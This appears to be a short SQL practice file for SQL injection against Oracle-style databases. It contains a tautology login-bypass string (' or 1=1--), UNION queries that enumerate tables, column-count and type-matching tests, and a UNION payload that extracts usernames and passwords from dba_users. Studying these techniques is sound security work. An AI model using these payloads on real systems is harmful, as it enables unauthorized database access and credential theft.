SELECT * FROM all_users WHERE USERNAME='' or  1=1--;

select * from all_users where username = 'test'
union select name from sysobjects where xtype='u';


SELECT * FROM
INFORMATION_SCHEMA.TABLES ;
-- wrong column
select 100 col1, 'a' col2 from dual
union  select 300 col3 from dual;

-- correct type
select 100 col1, 'a' col2 from dual 
union 
select 300 col1, 'b' col2 from dual;

-- wrong type
select 100 col1, 'b' col2 from dual
union
select 300 col1, sysdate from dual;



select sysdate from dual;




SELECT * FROM dba_users WHERE USERNAME='admin' and PASSWORD ='WHATEVER';

select * from all_users where username='sys'
UNION 
SELECT username,password from dba_users where 'a'='a';




